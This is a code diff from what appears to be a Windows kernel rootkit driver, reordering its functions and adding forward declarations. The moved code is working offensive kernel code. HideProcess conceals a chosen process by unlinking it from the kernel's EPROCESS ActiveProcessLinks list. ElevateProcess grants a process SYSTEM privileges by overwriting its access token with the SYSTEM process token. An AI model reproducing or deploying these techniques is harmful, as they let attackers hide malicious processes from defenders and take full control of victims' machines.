@@ -5,6 +5,9 @@
 bool FindProcess(ULONG pid);
 bool AddProcess(ULONG pid);
 bool RemoveProcess(ULONG pid);
+ULONG GetActiveProcessLinksOffset();
+VOID RemoveProcessLinks(PLIST_ENTRY current);
+UINT64 GetTokenOffset();
 
 /* -------------------------------------------------------------------------------------------------------------------------------------------- */
 
@@ -57,6 +60,46 @@ bool RemoveProcess(ULONG pid) {
 }
 
 /* -------------------------------------------------------------------------------------------------------------------------------------------- */
+
+NTSTATUS HideProcess(ULONG pid) {
+	// Getting the offset depending on the OS version.
+	ULONG pidOffset = GetActiveProcessLinksOffset();
+
+	if (pidOffset == STATUS_UNSUCCESSFUL) {
+		return STATUS_UNSUCCESSFUL;
+	}
+	ULONG listOffset = pidOffset + sizeof(INT_PTR);
+
+	// Enumerating the EPROCESSes and finding the target pid.
+	PEPROCESS currentEProcess = PsGetCurrentProcess();
+	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
+	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
+
+	if (*(UINT32*)currentPid == pid) {
+		RemoveProcessLinks(currentList);
+		return STATUS_SUCCESS;
+	}
+
+	PEPROCESS StartProcess = currentEProcess;
+
+	currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
+	currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
+	currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
+
+	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentEProcess)
+	{
+		if (*(UINT32*)currentPid == pid) {
+			RemoveProcessLinks(currentList);
+			return STATUS_SUCCESS;
+		}
+
+		currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
+		currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
+		currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
+	}
+
+	return STATUS_SUCCESS;
+}
 
 ULONG GetActiveProcessLinksOffset() {
 	ULONG activeProcessLinks = (ULONG)STATUS_UNSUCCESSFUL;
@@ -114,47 +157,31 @@ VOID RemoveProcessLinks(PLIST_ENTRY current) {
 	current->Flink = (PLIST_ENTRY)&current->Flink;
 }
 
-NTSTATUS HideProcess(ULONG pid) {
-	// Getting the offset depending on the OS version.
-	ULONG pidOffset = GetActiveProcessLinksOffset();
-
-	if (pidOffset == STATUS_UNSUCCESSFUL) {
-		return STATUS_UNSUCCESSFUL;
-	}
-	ULONG listOffset = pidOffset + sizeof(INT_PTR);
-
-	// Enumerating the EPROCESSes and finding the target pid.
-	PEPROCESS currentEProcess = PsGetCurrentProcess();
-	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
-	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
-
-	if (*(UINT32*)currentPid == pid) {
-		RemoveProcessLinks(currentList);
-		return STATUS_SUCCESS;
-	}
-
-	PEPROCESS StartProcess = currentEProcess;
-
-	currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
-	currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
-	currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
-
-	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentEProcess)
-	{
-		if (*(UINT32*)currentPid == pid) {
-			RemoveProcessLinks(currentList);
-			return STATUS_SUCCESS;
-		}
-
-		currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
-		currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
-		currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
-	}
-
-	return STATUS_SUCCESS;
-}
-
 /* -------------------------------------------------------------------------------------------------------------------------------------------- */
+
+NTSTATUS ElevateProcess(ULONG targetPid) {
+	PEPROCESS privilegedProcess, targetProcess;
+	NTSTATUS status = STATUS_SUCCESS;
+
+	// Getting the EProcess of the target and the privileged processes.
+	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &targetProcess);
+	UINT64 tokenOffset = GetTokenOffset();
+
+	if (!NT_SUCCESS(status))
+	{
+		return status;
+	}
+	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);
+
+	if (!NT_SUCCESS(status))
+	{
+		return status;
+	}
+
+	* (UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);
+
+	return status;
+}
 
 UINT64 GetTokenOffset() {
 	UINT64 tokenOffset = (UINT64)STATUS_UNSUCCESSFUL;
@@ -183,30 +210,6 @@ UINT64 GetTokenOffset() {
 	}
 
 	return tokenOffset;
-}
-
-NTSTATUS ElevateProcess(ULONG targetPid) {
-	PEPROCESS privilegedProcess, targetProcess;
-	NTSTATUS status = STATUS_SUCCESS;
-
-	// Getting the EProcess of the target and the privileged processes.
-	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &targetProcess);
-	UINT64 tokenOffset = GetTokenOffset();
-
-	if (!NT_SUCCESS(status))
-	{
-		return status;
-	}
-	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);
-
-	if (!NT_SUCCESS(status))
-	{
-		return status;
-	}
-
-	* (UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);
-
-	return status;
 }
 
 /* -------------------------------------------------------------------------------------------------------------------------------------------- */
